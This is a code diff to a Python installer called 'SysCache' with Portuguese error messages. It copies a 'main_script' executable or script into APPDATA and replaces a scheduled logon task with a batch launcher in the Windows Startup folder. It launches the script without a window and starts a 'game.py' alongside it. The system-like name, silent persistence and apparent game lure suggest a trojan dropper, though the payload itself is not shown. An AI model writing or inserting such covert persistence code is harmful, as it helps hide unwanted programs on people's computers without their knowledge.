@@ -5,7 +5,6 @@ import subprocess
 import platform
 
 APP_NAME = "SysCache"
-WIN_TASK_NAME = "SysCacheTask"
 MAC_LABEL = "com.syscache"
 
 SYSTEM = platform.system()
@@ -13,7 +12,18 @@ IS_WINDOWS = SYSTEM == "Windows"
 IS_MAC = SYSTEM == "Darwin"
 
 if IS_WINDOWS:
-    INSTALL_DIR = os.path.join(os.getenv("APPDATA"), APP_NAME)
+    APPDATA = os.getenv("APPDATA")
+    if not APPDATA:
+        raise RuntimeError("APPDATA não encontrado.")
+    INSTALL_DIR = os.path.join(APPDATA, APP_NAME)
+    STARTUP_DIR = os.path.join(
+        APPDATA,
+        "Microsoft",
+        "Windows",
+        "Start Menu",
+        "Programs",
+        "Startup",
+    )
 elif IS_MAC:
     INSTALL_DIR = os.path.expanduser(f"~/Library/Application Support/{APP_NAME}")
 else:
@@ -21,9 +31,9 @@ else:
 
 
 def get_resource_path(filename: str) -> str:
-    base_dir = os.path.dirname(os.path.abspath(__file__))
     if hasattr(sys, "_MEIPASS"):
         return os.path.join(sys._MEIPASS, filename)
+    base_dir = os.path.dirname(os.path.abspath(__file__))
     return os.path.join(base_dir, filename)
 
 
@@ -35,31 +45,67 @@ def copy_file_to_install(filename: str) -> str:
     src = get_resource_path(filename)
     if not os.path.exists(src):
         raise FileNotFoundError(f"Arquivo não encontrado: {src}")
+
     dst = os.path.join(INSTALL_DIR, filename)
+
+    if os.path.exists(dst):
+        try:
+            os.remove(dst)
+        except PermissionError:
+            pass
+
     shutil.copy2(src, dst)
     return dst
 
 
+def create_windows_startup_bat(target_path: str, is_python_script: bool = False) -> str:
+    os.makedirs(STARTUP_DIR, exist_ok=True)
+    bat_path = os.path.join(STARTUP_DIR, "syscache_launcher.bat")
+
+    if is_python_script:
+        pythonw = shutil.which("pythonw")
+        if not pythonw:
+            pythonw = sys.executable.replace("python.exe", "pythonw.exe")
+
+        bat_content = f'''@echo off
+start "" "{pythonw}" "{target_path}"
+exit
+'''
+    else:
+        bat_content = f'''@echo off
+start "" "{target_path}"
+exit
+'''
+
+    with open(bat_path, "w", encoding="utf-8") as f:
+        f.write(bat_content)
+
+    return bat_path
+
+
 def install_windows() -> None:
-    main_exe_path = copy_file_to_install("main_script.exe")
     game_path = copy_file_to_install("game.py")
 
-    subprocess.run(
-        f'schtasks /delete /tn "{WIN_TASK_NAME}" /f',
-        shell=True,
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL,
-    )
+    main_exe_src = get_resource_path("main_script.exe")
+    main_py_src = get_resource_path("main_script.py")
 
-    cmd = (
-        f'schtasks /create /tn "{WIN_TASK_NAME}" '
-        f'/tr "\\"{main_exe_path}\\"" /sc onlogon /f'
-    )
-    subprocess.run(cmd, shell=True, check=True)
+    if os.path.exists(main_exe_src):
+        main_path = copy_file_to_install("main_script.exe")
+        create_windows_startup_bat(main_path, is_python_script=False)
+        subprocess.Popen([main_path], shell=False)
+    elif os.path.exists(main_py_src):
+        main_path = copy_file_to_install("main_script.py")
+        create_windows_startup_bat(main_path, is_python_script=True)
 
-    subprocess.Popen([main_exe_path], shell=False)
+        pythonw = shutil.which("pythonw")
+        if not pythonw:
+            pythonw = sys.executable.replace("python.exe", "pythonw.exe")
 
-    python_cmd = shutil.which("python") or shutil.which("pythonw") or sys.executable
+        subprocess.Popen([pythonw, main_path], shell=False)
+    else:
+        raise FileNotFoundError("Nem main_script.exe nem main_script.py foram encontrados.")
+
+    python_cmd = shutil.which("pythonw") or shutil.which("python") or sys.executable
     subprocess.Popen([python_cmd, game_path], shell=False)
 
 
